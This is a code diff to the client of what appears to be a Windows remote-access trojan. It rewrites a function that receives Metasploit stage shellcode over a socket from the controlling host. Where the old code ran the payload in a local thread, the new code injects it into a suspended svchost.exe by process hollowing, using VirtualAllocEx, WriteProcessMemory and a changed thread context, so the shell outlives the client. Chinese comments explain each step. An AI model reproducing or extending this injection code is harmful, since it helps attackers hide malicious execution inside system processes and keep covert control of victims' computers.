@@ -354,6 +354,7 @@ BOOL MSF(SOCKET sServer, char cmd[])
 	ret = inet_pton(AF_INET, ip, &server.sin_addr.S_un.S_addr);
 	if (ret != 1)
 	{
+		closesocket(msf);
 		SendError(sServer);
 		return TRUE;
 	}
@@ -382,21 +383,55 @@ BOOL MSF(SOCKET sServer, char cmd[])
 
 	SendSuccess(sServer);
 
-	char* buffer = (char*)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	// 申请内存失败
-	if (buffer == NULL)
+	// 傀儡进程
+
+	/* 申请空间 */
+	unsigned char* buffer = (unsigned char*)malloc(sizeof(unsigned char) * size + 6);
+	if (!buffer)
 	{
 		closesocket(msf);
-		SendError(msf);
+		SendError(sServer);
+		return TRUE;
+	}
+
+	SendSuccess(sServer);
+	buffer[0] = 0xC0;
+	buffer[0] -= 1;
+	memcpy(buffer + 1, &msf, 4);
+
+	// 初始化结构体
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
+
+	BOOL bRet = FALSE;
+	// 创建挂起进程
+	bRet = CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
+	if (!bRet)
+	{
+		free(buffer);
+		closesocket(msf);
+		SendError(sServer);
 		return TRUE;
 	}
 
 	SendSuccess(sServer);
 
-	buffer[0] = 0xC0;
-	buffer[0] -= 1;
+	// 在进程中申请空间
+	LPVOID lpAddress = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpAddress)
+	{
+		free(buffer);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		closesocket(msf);
+		SendError(sServer);
+		return TRUE;
+	}
 
-	memcpy(buffer + 1, &msf, 4);
+	SendSuccess(sServer);
 
 	// 接收所有数据
 	int tret = 0;
@@ -409,10 +444,12 @@ BOOL MSF(SOCKET sServer, char cmd[])
 		nret = recv(msf, tb, size - tret, 0);
 		tb += nret;
 		tret += nret;
-
 		// 接收数据失败
 		if (nret == SOCKET_ERROR)
 		{
+			free(buffer);
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
 			SendError(sServer);
 			closesocket(msf);
 			return TRUE;
@@ -421,26 +458,64 @@ BOOL MSF(SOCKET sServer, char cmd[])
 
 	SendSuccess(sServer);
 
-	// 创建子线程来运行 缺点是client.exe 退出 msf也会退出
-	// 可以采用傀儡进程或者APC注入 来达到msf与client分离 
-	LPVOID lpAddress = (LPVOID)buffer;
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAddress, NULL, 0, NULL);
-	// 创建失败
-	if (!hThread)
+	// 写入shellcode数据
+	bRet = WriteProcessMemory(pi.hProcess, lpAddress, buffer, size + 6, NULL);
+	if (!bRet)
 	{
+		free(buffer);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		closesocket(msf);
 		SendError(sServer);
 		return TRUE;
 	}
 
-	CloseHandle(hThread);
 	SendSuccess(sServer);
 
-	/*void(*function)();
-	function = (void(*)())buffer;
-	function();*/
+	// 获取线程上下文
+	CONTEXT threadContext;
+	threadContext.ContextFlags = CONTEXT_FULL;
+	bRet = GetThreadContext(pi.hThread, &threadContext);
+	if (!bRet)
+	{
+		free(buffer);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		closesocket(msf);
+		SendError(sServer);
+		return TRUE;
+	}
 
-	printf("exec msf\n");
-	closesocket(msf);
+	SendSuccess(sServer);
+
+	//	修改线程上下文中EIP / RIP的值为申请的内存的首地址
+#ifdef _WIN64 
+	// 64位    
+	threadContext.Rip = (DWORD64)lpAddress;
+#else     
+	// 32位
+	threadContext.Eip = (DWORD)lpAddress;
+#endif
+
+	// 设置挂起进程的线程上下文
+	bRet = SetThreadContext(pi.hThread, &threadContext);
+	if (!bRet)
+	{
+		free(buffer);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		closesocket(msf);
+		SendError(sServer);
+		return TRUE;
+	}
+
+	SendSuccess(sServer);
+
+	// 恢复主线程
+	ResumeThread(pi.hThread);
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+	free(buffer);
 
 	Sleep(1000);
 	return TRUE;
